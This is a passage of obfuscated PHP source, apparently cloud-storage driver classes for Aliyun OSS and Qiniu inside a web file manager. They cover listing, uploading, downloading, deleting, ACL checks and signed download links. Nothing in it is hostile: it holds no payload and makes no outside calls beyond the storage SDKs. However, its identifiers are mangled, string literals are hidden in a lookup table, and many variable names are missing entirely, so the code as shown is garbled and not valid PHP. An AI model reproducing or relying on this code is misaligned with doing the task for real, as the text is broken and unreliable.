foreach ($Ǩ as $䅬 => $ӯ) { $ٿ[] = array($[297] => $䅬 + 1, $[298] => $ӯ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($є), $̸, $ٿ); } catch (OSS\Core\OssException $Ы) { $this->writeLog(__FUNCTION__ . $[212] . $Ы->getMessage()); return !1; } return !0; } public function moveFile($ȏ, $ȴ) { if ($this->copyFile($ȏ, $ȴ)) { $this->remove($ȏ); return $this->getPathOuter($ȴ); } return !1; } public function delFile($) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $Ơ) { $this->writeLog(__FUNCTION__ . $_SERVER[][212] . $Ơ->getMessage()); return !1; } return !0; } public function delFolder($Ŷ) { $͔ =& $_SERVER[]; if (!$this->exist($Ŷ)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($Ŷ); $this->listItemCache = !0; $ = trim($Ŷ, $͔[8]) . $͔[8]; if (!empty($Ŷ) && $Ŷ !== $͔[228] && !in_array($, $[$͔[85]])) { $[$͔[85]][] = $; } $ = $this->delByBatch($[$͔[86]]); if (!$) { return !1; } $ = $this->delByBatch($[$͔[85]]); if (!$) { return !1; } return $this->delFile($); } private function delByBatch($᲍) { foreach (array_chunk($᲍, 1000) as $) { try { $this->client->deleteObjects($this->bucket, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $_SERVER[][212] . $->getMessage()); return !1; } } return !0; } public function rename($, $ӌ) { return $this->renameObject($, $ӌ); } private function fileInfo($, $Ħ = false, $Ĺթ = array()) { $ĿĶ =& $_SERVER[]; $ = array($ĿĶ[32] => $this->pathThis($), $ĿĶ[87] => $this->getPathOuter($), $ĿĶ[33] => $ĿĶ[230], $ĿĶ[79] => isset($Ĺթ[$ĿĶ[79]]) ? $Ĺթ[$ĿĶ[79]] : 0, $ĿĶ[166] => $this->ext($)); if ($Ħ) { return $; } $[$ĿĶ[231]] = $[$ĿĶ[88]] = 0; $[$ĿĶ[232]] = $[$ĿĶ[233]] = !0; if (empty($Ĺթ)) { $ = $this->objectMeta($); if (!$) { return $; } $Ĺթ = array($ĿĶ[88] => strtotime($[$ĿĶ[1681]]), $ĿĶ[79] => $[$ĿĶ[1680]] + 0, $ĿĶ[1679] => $[$ĿĶ[1679]]); } if (isset($Ĺթ[$ĿĶ[1679]]) && $Ĺթ[$ĿĶ[1679]]) { $[$ĿĶ[235]] = trim($Ĺթ[$ĿĶ[1679]], $ĿĶ[118]); } if (isset($Ĺթ[$ĿĶ[79]])) { $[$ĿĶ[79]] = $Ĺթ[$ĿĶ[79]]; } if (isset($Ĺթ[$ĿĶ[88]])) { $[$ĿĶ[88]] = $Ĺթ[$ĿĶ[88]]; } if (isset($Ĺթ[$ĿĶ[204]]) && !trim($[$ĿĶ[88]])) { $[$ĿĶ[88]] = $Ĺթ[$ĿĶ[204]]; } return $; } private function folderInfo($, $婞 = false, $ʑ = array()) { $ϟݿ =& $_SERVER[]; $ = array($ϟݿ[32] => $this->pathThis($), $ϟݿ[87] => $this->getPathOuter($ϟݿ[8] . $), $ϟݿ[33] => $ϟݿ[78]); if ($婞) { return $; } $[$ϟݿ[231]] = $[$ϟݿ[88]] = 0; $[$ϟݿ[232]] = $[$ϟݿ[233]] = !0; if (empty($ʑ)) { $ = rtrim($, $ϟݿ[8]) . $ϟݿ[8]; $Α = $this->objectMeta($); if (!$Α) { return $; } $ʑ = array($ϟݿ[231] => $Α[$ϟݿ[595]][$ϟݿ[1684]], $ϟݿ[88] => strtotime($Α[$ϟݿ[1681]])); } if (isset($ʑ[$ϟݿ[88]])) { $[$ϟݿ[88]] = $ʑ[$ϟݿ[88]]; } if (isset($ʑ[$ϟݿ[231]])) { $[$ϟݿ[231]] = $ʑ[$ϟݿ[231]]; } return $; } public function listPath($, $ = false) { $̰ =& $_SERVER[]; $ = $this->fileList($, $̰[8], !0); foreach ($[$̰[85]] as $ => $Ǎ) { $[$̰[85]][$] = $this->folderInfo($Ǎ, $, $Ǎ); } foreach ($[$̰[86]] as $ => $Ǎ) { $[$̰[86]][$] = $this->fileInfo($Ǎ[$̰[32]], $, $Ǎ); } return $; } protected function infoChildren($ɼ, &$Ώ) { $Ή =& $_SERVER[]; $ = $this->fileList($ɼ, $Ή[12], !0); $Ώ[$Ή[81]] += count($[$Ή[85]]); $Ώ[$Ή[80]] += count($[$Ή[86]]); foreach ($[$Ή[86]] as $ȕ) { if (!$ȕ || !$ȕ[$Ή[79]]) { continue; } $Ώ[$Ή[79]] += $ȕ[$Ή[79]]; } } public function has($현, $ = false, $ = true) { $Ά =& $_SERVER[]; $현 = trim($현, $Ά[8]); $ꟲ = empty($현) && $현 !== $Ά[228] ? $Ά[12] : $현 . $Ά[8]; $ן = $Ά[12]; $ˤܮ = 500; $ = $ = 0; while (!0) { check_abort(); $ɗ = array($Ά[1675] => $Ά[8], $Ά[1676] => $ꟲ, $Ά[1677] => $ˤܮ, $Ά[1678] => $ן); try { $ = $this->client->listObjects($this->bucket, $ɗ); } catch (OSS\Core\OssException $Д) { $this->writeLog(__FUNCTION__ . $Ά[212] . $Д->getMessage()); break; } $ן = $->getNextMarker(); $ķɸ = $->getObjectList(); $׀ = $->getPrefixList(); if ($) { if (count($ķɸ) > 1 || count($ķɸ) == 1 && $ķɸ[0]->getKey() != $ꟲ) { $ += count($ķɸ) - 1; } if (!empty($׀)) { $ += count($׀); } if ($ן === $Ά[12]) { break; } continue; } if ($) { if (!empty($ķɸ)) { if (count($ķɸ) > 1 || $ķɸ[0]->getKey() != $ꟲ) { return !0; } } } else { if (!empty($׀)) { return !0; } } if ($ן === $Ά[12]) { break; } } if ($) { return array($Ά[239] => $, $Ά[240] => $); } return !1; } public function listAll($Ⱦ) { $Ջ =& $_SERVER[]; $ = $this->fileList($Ⱦ, $Ջ[12], !0); $ = array_to_keyvalue($[$Ջ[86]], $Ջ[32]); foreach ($[$Ջ[85]] as $) { if (is_string($)) { $[$] = array($Ջ[79] => 0); } } return $this->listAllFiles($Ⱦ, $); } public function canRead($晦) { $ٞ =& $_SERVER[]; $ȱ = $this->pathAcl($晦); return $ȱ == $ٞ[1685] || $ȱ == $ٞ[642] ? !0 : !1; } public function canWrite($Ã) { $ف = $this->pathAcl($Ã); return $ف == $_SERVER[][642] ? !0 : !1; } public function pathAcl($) { $ȼ =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Է = $this->client->getObjectAcl($this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $җ) { $this->writeLog(__FUNCTION__ . $ȼ[212] . $җ->getMessage()); return !1; } $ = $Է == $ȼ[37] ? $this->bucketAcl : $Է; if ($ == $ȼ[1686]) { return $ȼ[1685]; } if ($ == $ȼ[1687]) { return $ȼ[642]; } return $; } private function chmodPath($, $ = '') { $Ƹƻ =& $_SERVER[]; $ޮ = empty($) ? $Ƹƻ[1687] : $; $ = array($Ƹƻ[37], $Ƹƻ[229], $Ƹƻ[1686], $Ƹƻ[1687]); if (!in_array($ޮ, $)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($), $ޮ); } catch (OSS\Core\OssException $Һ) { $this->writeLog(__FUNCTION__ . $Ƹƻ[212] . $Һ->getMessage()); return !1; } return !0; } public function getContent($ҝ̹) { return $this->fileSubstr($ҝ̹, -1); } public function setContent($, $ȟ = '') { $ =& $_SERVER[]; try { $ = $this->trafficLimit($[1688]); $ƴ = $this->client->putObject($this->bucket, $this->pathEncode($), $ȟ, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $[212] . $->getMessage()); return !1; } $е = array($[1682] => trim($ƴ[$[1679]], $[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($))); $this->updateObjMeta($, $е); return isset($ƴ[$[1689]][$[294]]) ? !0 : !1; } private function updateObjMeta($, $֥Ƙ) { $ = $this->pathEncode($); try { $ = array(OSS\OssClient::OSS_HEADERS => $֥Ƙ); $this->client->copyObject($this->bucket, $, $this->bucket, $, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $_SERVER[][212] . $->getMessage()); return !1; } return !0; } public function upload($ɕ, $濅, $ = false, $ = REPEAT_REPLACE) { $ڍʰ =& $_SERVER[]; if (!$濅 || !@file_exists($濅)) { return !1; } $Ġ = trim($ɕ, $ڍʰ[8]); $ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ڍʰ[1682] => @md5_file($濅)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ɕ))); $ = $this->trafficLimit($ڍʰ[1688], $); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ġ), $濅, $); } catch (OSS\Core\OssException $桁) { $this->writeLog(__FUNCTION__ . $ڍʰ[212] . $桁->getMessage()); return !1; } return $this->getPathOuter($ɕ); } public function getHost() { $Ƴ =& $_SERVER[]; $䶪 = explode($Ƴ[208], parent::getHost()); return $䶪[0] . $Ƴ[208] . $this->bucket . $Ƴ[10] . $䶪[1]; } public function uploadFormData($, $ = 3600) { $臖 =& $_SERVER[]; if (!($ꨔ = $this->getHost())) { return !1; } $⺱ = $; $ = date($臖[1690], time() + $⺱); $Ҍ = new DateTime($); $Ϳ = $Ҍ->format(DateTime::ISO8601); $܁ = strpos($Ϳ, $臖[371]); $Ϳ = substr($Ϳ, 0, $܁) . $臖[1691]; $ړ = 1048576000 * 5; $ = $this->pathFather($); $ȸ = array($臖[262] => $Ϳ, $臖[265] => array(array($臖[1692], 0, $ړ), array($臖[267], $臖[268], $))); $̡ = base64_encode(json_encode($ȸ)); $ٕ = base64_encode(hash_hmac($臖[1518], $̡, $this->secret, !0)); $ڜ = array($臖[1693] => $this->accessKey, $臖[277] => $̡, $臖[270] => $臖[261], $臖[1694] => $ٕ, $臖[206] => $ꨔ); $ڜ = $this->trafficLimit($臖[1688], $ڜ, !0); return $ڜ; } public function uploadMultiData($, $ЭԈ = 3600) { $ =& $_SERVER[]; if (!($ = $this->getHost())) { return !1; } $ޤ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($)); return array($[281] => $ޤ, $[206] => $ . $[8] . $this->pathEncode($), $[282] => gmdate($[1695]), $[95] => $); } public function uploadMultiAuth($, $ = array()) { if (isset($[$_SERVER[][283]])) { return $this->uploadPartAuth($, $); } return $this->uploadListAuth($, $); } private function uploadPartAuth($߉, $򜾋 = array()) { $ =& $_SERVER[]; $驆 = $򜾋[$[95]]; $̶ = $this->_getUploadAuth($驆, $򜾋); $ = array($[286] => $̶[$[286]], $[282] => $̶[$[282]]); if (isset($̶[$[1696]])) { $[$[1696]] = $̶[$[1696]]; } return $; } private function uploadListAuth($ΰ, $򬡻 = array()) { $ =& $_SERVER[]; $ؼֶ = $򬡻[$[95]]; $͉ = $򬡻[$[281]]; $ = $this->client->listParts($this->bucket, $this->pathEncode($ؼֶ), $͉); $ӤՖ = $->getListPart(); $ᢪ = array(); foreach ($ӤՖ as $볻) { $ᢪ[] = array($[297] => $볻->getPartNumber(), $[298] => trim($볻->getETag(), $[118])); } if (!$ᢪ) { return !1; } $ҧ = $this->_getUploadAuth($ؼֶ, $򬡻); return array($[286] => $ҧ[$[286]], $[282] => $ҧ[$[282]], $[289] => $ᢪ); } private function _getUploadAuth($ǎ, $) { $ɭ =& $_SERVER[]; $ԉ = gmdate($ɭ[1695]); $ = isset($[$ɭ[283]]) ? $ɭ[253] : $ɭ[288]; $ = array_intersect_key($, array_flip(array($ɭ[283], $ɭ[281]))); ksort($); $ = $ ? $ɭ[76] . http_build_query($, null, $ɭ[284], PHP_QUERY_RFC3986) : $ɭ[12]; $ = array($, $ɭ[12], $ɭ[120], $ԉ, "\170\55\157\163\x73\55\144\x61\164\x65\72{$ԉ}", $ɭ[8] . $this->bucket . $ɭ[8] . $ǎ . $); if (isset($[$ɭ[283]])) { $ޙ = $this->trafficLimit($ɭ[1688], array(), !0); if ($ޙ) { $ǎ = $ɭ[1696]; array_splice($, 5, 0, $ǎ . $ɭ[4] . $ޙ[$ǎ]); } } $ = implode($ɭ[285], $); $˴ʫ = base64_encode(hash_hmac($ɭ[1518], $, $this->secret, !0)); $돼Ρ = $ɭ[1665] . $this->accessKey . $ɭ[4] . $˴ʫ; $ݕ = array($ɭ[286] => $돼Ρ, $ɭ[282] => $ԉ); if (!empty($ޙ)) { $ݕ = array_merge($ݕ, $ޙ); } return $ݕ; } public function download($, $΁) { $ =& $_SERVER[]; if ($this->isFolder($)) { return !1; } try { $٣ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $΁); $٣ = $this->trafficLimit($[109], $٣); $this->client->getObject($this->bucket, $this->pathEncode($), $٣); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $[212] . $->getMessage()); return !1; } return $΁; } public function fileSubstr($҂, $ϙ߽ = 0, $ڏ = false) { if ($ϙ߽ === -1) { $ = array(); } else { if ($ڏ === !1) { $ǆʋ = $this->size($҂); } else { $ǆʋ = $ϙ߽ + $ڏ - 1; } $ = array(OSS\OssClient::OSS_RANGE => "{$ϙ߽}\x2d{$ǆʋ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($҂), $); } catch (OSS\Core\OssException $ｾ) { $this->writeLog(__FUNCTION__ . $_SERVER[][212] . $ｾ->getMessage()); think_exception($ｾ->getMessage()); return !1; } } private function trafficLimit($Ԝ, $ݲڋ = array(), $ = false) { $ЄӬ =& $_SERVER[]; if ($Ԝ == $ЄӬ[1688] && $this->isUploadServer() || $Ԝ == $ЄӬ[109] && $this->isFileOutServer()) { return $ݲڋ; } $ = floatval($GLOBALS[$ЄӬ[6]][$ЄӬ[92]][$ЄӬ[107]][$Ԝ]) * 1024 * 1024 * 8; if (!$) { return $ݲڋ; } $ = $ < 819200 ? 819200 : ($ > 838860800 ? 838860800 : $); if ($) { $ݲڋ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($); } else { if (!isset($ݲڋ[OSS\OssClient::OSS_HEADERS])) { $ݲڋ[OSS\OssClient::OSS_HEADERS] = array(); } $ݲڋ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($); } return $ݲڋ; } public function link($ڽ, $ц = array()) { $ =& $_SERVER[]; if (!$this->exist($ڽ) || $this->isFolder($ڽ)) { return !1; } try { $ц = $this->trafficLimit($[109], $ц, !0); $Й = $this->client->signUrl($this->bucket, $this->pathEncode($ڽ), 3600 * 12, $[1599], $ц); return $this->getCdnLink($Й); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $[212] . $->getMessage()); return !1; } } public function fileOut($, $ = false, $ⱛ = false, $ϛ = '') { $랫 =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($, $, $ⱛ, $ϛ); } if (!$ⱛ) { $ⱛ = $this->pathThis($); } $ⱛ = rawurlencode($ⱛ); $ = get_file_mime(get_path_ext($ⱛ)); if ($ == $랫[248]) { return parent::fileOut($, $, $ⱛ, $ϛ); } $ = $ ? $랫[1697] : $랫[1698]; $엮 = array(OSS\OssClient::OSS_SUB_RESOURCE => $랫[1699] . rawurlencode("{$}\73\x66\x69\x6c\x65\156\x61\x6d\x65\x3d{$ⱛ}")); $Ó = $this->link($, $엮); $this->fileOutLink($Ó); } public function fileOutServer($, $̞ = false, $פ = false, $҆ = '') { parent::fileOut($, $̞, $פ, $҆); } public function fileOutImage($, $ߍ = 250) { if ($this->size($) > 1024 * 1024 * 20) { return $this->fileOutImageServer($, $ߍ); } $ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1662] . $ߍ); $ٺ = $this->link($, $); $this->fileOutLink($ٺ); } public function fileOutImageServer($, $˳ = 250) { parent::fileOutImage($, $˳); } public function fileOutLink($) { $٘ =& $_SERVER[]; if (!$this->isCdnHost() && substr($, 0, 7) == $٘[216]) { $ = $٘[217] . substr($, 7); } header($٘[172] . $); die; } public function hashMd5($עѽ, $ = '') { $ת =& $_SERVER[]; $ջ = $this->_objectMeta($עѽ); if (!$ջ) { return $ת[12]; } if (!isset($ջ[$ת[1682]]) && !empty($)) { $އ = $this->updateObjMeta($עѽ, array($ת[1682] => $)); $ջ[$ת[1682]] = $އ ? $ : $ת[12]; } return isset($ջ[$ת[1682]]) ? strtolower($ջ[$ת[1682]]) : $ת[12]; } public function size($ƶ) { $鞕ތ = $this->objectMeta($ƶ); return $鞕ތ ? $鞕ތ[$_SERVER[][79]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($с) { return $this->isFile($с) || $this->isFolder($с); } public function isFile($֠) { return !$this->isFolder($֠) && $this->objectMeta($֠); } public function isFolder($ʮӛ) { return $this->cacheMethod($_SERVER[][177], $ʮӛ); } protected function objectMeta($ߺ̀) { return $this->cacheMethod($_SERVER[][179], $ߺ̀); } protected function _objectMeta($﬈) { $ۀ =& $_SERVER[]; try { $ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($﬈)); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $ۀ[212] . $->getMessage()); $ = !1; } if ($) { $[$ۀ[79]] = intval($[$ۀ[1680]]); } return $; } protected function _isFolder($ޛ) { $ϕ =& $_SERVER[]; if ($ޛ == $ϕ[12] || $ޛ == $ϕ[8]) { return !0; } $ = array($ϕ[1675] => $ϕ[8], $ϕ[1676] => rtrim($ޛ, $ϕ[8]) . $ϕ[8], $ϕ[1677] => 1, $ϕ[1678] => $ϕ[12]); $ú = $this->client->listObjects($this->bucket, $); if ($ú->getObjectList() || $ú->getPrefixList()) { return !0; } return !1; } public function writeLog($ = '', $ = false) { $ =& $_SERVER[]; $ = in_array(ACTION, array($[210], $[211])); if (!$ && !GLOBAL_DEBUG) { return; } $代 = 0; if (stripos($, $[1700]) !== !1) { $代 = 1; $פ = explode($[1701], $); $ = !empty($פ[1]) ? $פ[1] : $; } else { if (stripos($, $[1702])) { $代 = 2; $פ = explode($[1702], $); $פ = explode($[4], $פ[0]); $ = !empty($פ[1]) ? $פ[1] : $; } } if ($ && I18n::getType() == $[1703]) { if ($代 == 1) { $ = str_replace($[1704], $[1705], $); } else { if ($代 == 2) { $פ = explode($[212], $פ[0]); $ = isset($פ[1]) ? $פ[1] : $[12]; $薽 = array($[1706] => $[1707], $[1708] => $[1709], $[1710] => $[1711], $[1712] => $[1713], $[1714] => $[1715], $[1716] => $[1717], $[1718] => $[1719], $[1720] => $[1721], $[1722] => $[1723], $[1724] => $[1725]); if (isset($薽[$])) { $ = $薽[$]; } } } if (stripos($, $[1726])) { $ = $[1727]; } } if (!trim($)) { return; } parent::writeLog(trim($), $); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1728]; $this->_init($); } public function _init($沐) { $ω =& $_SERVER[]; $this->config = $沐; foreach ($沐 as $ => $) { if (isset($this->{$})) { $this->{$} = $; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ω[1729] . LNG($ω[1666])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($, $݊ = '', $Ͻ = REPEAT_RENAME) { if ($this->setContent($, $݊)) { return $this->getPathOuter($); } return !1; } public function mkdir($ǧ, $ϝ = REPEAT_SKIP) { $ =& $_SERVER[]; $ = trim($ǧ, $[8]); if ($this->_isFolder($)) { return $this->getPathOuter($); } $ǧ = $ . $[8]; $뗛Ӈ = get_path_this($); $久 = $ǧ . $뗛Ӈ; if (!$this->mkfile($久)) { return !1; } if (!$this->moveFile($久, $ǧ)) { $this->delFile($久); return !1; } return $this->getPathOuter($); } public function copyFile($بΦ, $￶) { $Ꝛ = $this->bucketManager->copy($this->bucket, $بΦ, $this->bucket, $￶, !0); return $Ꝛ ? !1 : $this->getPathOuter($￶); } public function moveFile($, $蓣ϼ) { $ = $this->bucketManager->move($this->bucket, $, $this->bucket, $蓣ϼ, !0); return $ ? !1 : $this->getPathOuter($蓣ϼ); } public function delFile($) { if (!$this->exist($)) { return !0; } $ = $this->bucketManager->delete($this->bucket, $); if (!$) { return !0; } return $->code() == 612 ? !0 : !1; } public function delFolder($ѻ) { $ =& $_SERVER[]; if (!$this->exist($ѻ)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($ѻ); $this->listItemCache = !0; $ = trim($ѻ, $[8]) . $[8]; if (!empty($ѻ) && $ѻ !== $[228] && !in_array($, $[$[85]])) { $[$[85]][] = $; } $õ = $this->delByBatch($[$[86]]); if (!$õ) { return !1; } $õ = $this->delByBatch($[$[85]]); if (!$õ) { return !1; } return $this->delFile($); } private function delByBatch($괾) { foreach (array_chunk($괾, 1000) as $) { $ = $this->bucketManager->buildBatchDelete($this->bucket, $); list($ᐃ, $ԣ펎) = $this->bucketManager->batch($); if ($ԣ펎) { return !1; } } return !0; } public function rename($Ҥ, $) { return $this->renameObject($Ҥ, $); } public function fileInfo($ۭ, $ۄ = false, $ = array()) { $ڀ =& $_SERVER[]; $ = array($ڀ[32] => $this->pathThis($ۭ), $ڀ[87] => $this->getPathOuter($ڀ[8] . $ۭ), $ڀ[33] => $ڀ[230], $ڀ[79] => isset($[$ڀ[1730]]) ? $[$ڀ[1730]] : 0, $ڀ[166] => $this->ext($ۭ)); if ($ۄ) { return $; } $[$ڀ[231]] = $[$ڀ[88]] = 0; $[$ڀ[232]] = $[$ڀ[233]] = !0; if (empty($)) { $ = $this->objectMeta($ۭ); if (!$) { return $; } } if (isset($[$ڀ[234]]) && $[$ڀ[234]]) { $[$ڀ[235]] = $[$ڀ[234]]; } if (isset($[$ڀ[245]]) && $[$ڀ[245]]) { $[$ڀ[235]] = $[$ڀ[245]]; } if (isset($[$ڀ[1731]])) { $[$ڀ[88]] = substr($[$ڀ[1731]] . $ڀ[12], 0, 10); } if (isset($[$ڀ[1730]])) { $[$ڀ[79]] = $[$ڀ[1730]]; } return $; } public function folderInfo($ъ, $ѧ = false) { $ǣ֔ =& $_SERVER[]; $餽ͫ = array($ǣ֔[32] => $this->pathThis($ъ), $ǣ֔[87] => $this->getPathOuter($ǣ֔[8] . $ъ), $ǣ֔[33] => $ǣ֔[78]); if ($ѧ) { return $餽ͫ; } $餽ͫ[$ǣ֔[231]] = $餽ͫ[$ǣ֔[88]] = 0; $餽ͫ[$ǣ֔[232]] = $餽ͫ[$ǣ֔[233]] = !0; $ъ = rtrim($ъ, $ǣ֔[8]) . $ǣ֔[8]; $ȯ = $this->objectMeta($ъ); if (isset($ȯ[$ǣ֔[1731]])) { $餽ͫ[$ǣ֔[88]] = substr($ȯ[$ǣ֔[1731]] . $ǣ֔[12], 0, 10); } return $餽ͫ; } public function listPath($, $ = false) { $ =& $_SERVER[]; $㘱 = $this->fileList($, $[8], !0); foreach ($㘱[$[85]] as $ => $Ɵ) { $㘱[$[85]][$] = $this->folderInfo($Ɵ, $); } foreach ($㘱[$[86]] as $ => $Ɵ) { $㘱[$[86]][$] = $this->fileInfo($Ɵ[$[32]], $, $Ɵ); } return $㘱; } public function has($, $ = false, $Ѥ = true) { $ =& $_SERVER[]; $ = trim($, $[8]); $ = empty($) && $ !== $[228] ? $[12] : $ . $[8]; $ӗő = $[12]; $Δ = 500; $ = $[8]; $Í = $ՠ = 0; while (!0) { check_abort(); list($Θ, $Ծ) = $this->bucketManager->listFiles($this->bucket, $, $ӗő, $Δ, $); if ($Ծ) { break; } $ӗő = array_key_exists($[1678], $Θ) ? $ӗő = $Θ[$[1732]] : $[12]; if ($) { if (!empty($Θ[$[1733]])) { $Í += count($Θ[$[1733]]); } if (!empty($Θ[$[1734]])) { $ՠ += count($Θ[$[1734]]); } if ($ӗő === $[12]) { break; } continue; } if ($Ѥ) { if (!empty($Θ[$[1733]])) { return !0; } } else { if (!empty($Θ[$[1734]])) { return !0; } } if ($ӗő === $[12]) { break; } } if ($) { return array($[239] => $Í, $[240] => $ՠ); } return !1; } public function listAll($) { $󣞑 =& $_SERVER[]; $ = $this->fileList($, $󣞑[12], !0); $Ԣ = array_to_keyvalue($[$󣞑[86]], $󣞑[32]); foreach ($[$󣞑[85]] as $) { if (is_string($)) { $Ԣ[$] = array($󣞑[79] => 0); } } return $this->listAllFiles($, $Ԣ); } private function fileList($, $́ = '', $ヅ = 0) { $ɳ =& $_SERVER[]; $ = trim($, $ɳ[8]); $Ԇ߹ = empty($) && $ !== $ɳ[228] ? $ɳ[12] : $ . $ɳ[8]; $鑐 = $ɳ[12]; $ď = 1000; $ = $愔 = array(); while (!0) { check_abort(); list($, $թ) = $this->bucketManager->listFiles($this->bucket, $Ԇ߹, $鑐, $ď, $́); if ($թ) { break; } $鑐 = array_key_exists($ɳ[1678], $) ? $鑐 = $[$ɳ[1732]] : $ɳ[12]; $۴݋ = isset($[$ɳ[1733]]) ? $[$ɳ[1733]] : array(); $ = isset($[$ɳ[1734]]) ? $[$ɳ[1734]] : array(); foreach ($۴݋ as $듧) { if ($듧[$ɳ[95]] == $Ԇ߹) { continue; } $՛ = $듧[$ɳ[95]]; $ǘ = $듧[$ɳ[1730]]; $듧[$ɳ[32]] = $՛; $듧[$ɳ[79]] = $ǘ; $ = $ǘ == 0 && substr($՛, strlen($՛) - 1, 1) == $ɳ[8] ? !0 : !1; $this->cacheMethodInfoSet($՛, $, $듧); if ($) { $[] = $՛; continue; } $愔[] = $ヅ ? $듧 : $՛; } foreach ($ as $՛) { if ($՛ == $Ԇ߹) { continue; } $[] = $՛; $this->cacheMethodInfoSet($՛, !0); } if ($鑐 === $ɳ[12]) { break; } } $this->cacheMethodInfoSet($, !0); return array($ɳ[85] => $, $ɳ[86] => $愔); } public function canRead($) { return $this->exist($) ? !0 : !1; } public function canWrite($) { return $this->exist($) ? !0 : !1; } public function getContent($) { return $this->fileSubstr($, 0, -1); } public function setContent($οȣ, $᤻ = '') { $ = $this->tempFile($this->pathThis($οȣ)); file_put_contents($, $᤻); if ($this->upload($οȣ, $)) { $this->tempFileRemve($); return !0; } return !1; } public function refreshUrls($釧) { $ =& $_SERVER[]; $Ɉ = array(); if (is_array($釧)) { foreach ($釧 as $) { $Ɉ[] = $this->link($); } } else { $Ɉ[] = $this->link($釧); } $ = new Qiniu\Cdn\CdnManager($this->auth); list($ݩ, $׺Ī) = $->refreshUrls($Ɉ); if ($׺Ī) { return !1; } return $ݩ[$[1365]] == $[854] ? !0 : !1; } public function fileSubstr($Ƶ, $̭, $) { $ =& $_SERVER[]; if (!($ = $this->link($Ƶ))) { return !1; } $ⱡͥ = !1; if ($ > 0) { $Ն = $̭ + $ - 1; $ⱡͥ = array($[1598] . $̭ . $[476] . $Ն); } $۪ = url_request($, $[1599], !1, $ⱡͥ); return $۪[$[844]] ? $۪[$[1386]] : !1; } public function upload($, $, $¤ = false, $˱ = REPEAT_REPLACE) { if (!$ || !@file_exists($)) { return !1; } $ = new Qiniu\Storage\UploadManager(); $ϲ = $this->auth->uploadToken($this->bucket, $); $㼢ǭ = get_file_mime(get_path_ext($)); list($, $ȁ) = $->putFile($ϲ, $, $, null, $㼢ǭ); return $ȁ ? !1 : $this->getPathOuter($); } public function uploadFormData($ۜú, $Ҳ = 3600) { return $this->uploadToken($ۜú, $Ҳ); } public function uploadMultiData($ح, $Ԩ = 3600) { return $this->uploadToken($ح, $Ԩ); } private function uploadToken($ߗÖ, $ = 3600) { $ʭ =& $_SERVER[]; $ɀ = $; $ = array($ʭ[1735] => $ʭ[1736]); $Ѿ = $ߗÖ; $ = $this->auth->uploadToken($this->bucket, $Ѿ, $ɀ, $, !0); $ö = empty($this->region) || $this->region == $ʭ[1737] ? $ʭ[12] : $ʭ[476] . $this->region; $ᄟ = http_type() . "\x3a\x2f\57\165\160\154\x6f\141\x64{$ö}\56\161\x69\156\x69\165\x70\56\x63\x6f\155\x2f"; return array($ʭ[1738] => $, $ʭ[1601] => $ᄟ); } public function download($Ō, $钭) { $ߒ = IO::getPathInner(IO::mkfile($钭)); if (!($ҟ = $this->link($Ō))) { return !1; } $ = 0; $ѳ = 1024 * 200; $ = fopen($ߒ, $_SERVER[][1739]); while (!0) { $͹ = $this->fileSubstr($Ō, $, $ѳ); if ($͹ === !1) { return !1; } fwrite($, $͹); $ += $ѳ; if (strlen($͹) < $ѳ) { break; } } fclose($); return $钭; } public function link($݂Ŭ, $ = '') { if (!$this->isFile($݂Ŭ)) { return !1; } $έ = $this->getHost() . $_SERVER[][8] . $this->pathEncode($݂Ŭ) . $; return $this->auth->privateDownloadUrl($έ, 3600 * 12); } public function fileOut($ɪ, $ߌ = false, $槿 = false, $Ĕ = '') { $ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($ɪ, $ߌ, $槿, $Ĕ); } if (!$槿) { $槿 = $this->pathThis($ɪ); } $叏 = $ߌ ? $[1740] . rawurlencode($槿) : $[12]; $ఘ = $this->link($ɪ, $叏); $this->fileOutLink($ఘ); } public function fileOutServer($, $ = false, $ۊ = false, $ = '') { parent::fileOut($, $, $ۊ, $); } public function fileOutImage($π, $祗 = 250) { if ($this->size($π) > 1024 * 1024 * 20) { return 